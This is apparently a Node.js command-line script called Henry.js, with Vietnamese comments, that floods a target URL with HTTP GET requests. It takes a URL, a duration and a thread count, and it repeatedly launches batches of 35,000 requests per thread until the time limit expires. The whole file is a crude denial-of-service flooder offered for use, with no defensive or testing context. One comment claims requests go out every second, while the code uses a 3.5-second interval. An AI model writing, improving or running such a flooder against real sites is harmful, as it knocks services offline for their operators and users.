const axios = require('axios');
const async = require('async');
const process = require('process');

// Hàm gửi yêu cầu đến URL
const sendRequest = async (url) => {
    try {
        const response = await axios.get(url);
        console.log(`[HENRY] Status Code: ${response.status}`);
    } catch (error) {
        console.error(`[HENRY] Error: ${error.message}`);
    }
};

// Hàm gửi nhiều yêu cầu đồng thời
const sendRequests = async (url, requestsPerThread) => {
    const queue = async.queue(async () => {
        for (let i = 0; i < requestsPerThread; i++) {
            await sendRequest(url);
        }
    });

    queue.push({}, () => {
        console.log('[HENRY] Thread completed');
    });

    queue.drain(() => {
        console.log('[HENRY] All threads completed');
    });
};

// Nhập thông tin từ dòng lệnh
const main = () => {
    if (process.argv.length < 4) {
        console.log('Usage: Henry.js <URL> <Time> <Thread>');
        process.exit(1);
    }

    const url = process.argv[2];
    const timeLimit = parseInt(process.argv[3], 10);
    const numThreads = parseInt(process.argv[4], 10);
    const requestsPerThread = 35000; // Số lượng yêu cầu mặc định mỗi thread

    console.log(`Starting to send requests to ${url}`);
    console.log(`Time Limit: ${timeLimit} seconds`);
    console.log(`Number of Threads: ${numThreads}`);
    console.log(`Requests per Thread: ${requestsPerThread}`);

    const startTime = Date.now();
    const endTime = startTime + timeLimit * 1000;

    const interval = setInterval(() => {
        if (Date.now() > endTime) {
            clearInterval(interval);
            console.log('[HENRY] Time limit reached');
            return;
        }

        for (let i = 0; i < numThreads; i++) {
            sendRequests(url, requestsPerThread);
        }
    }, 3500); // Gửi yêu cầu mỗi giây
};

main();
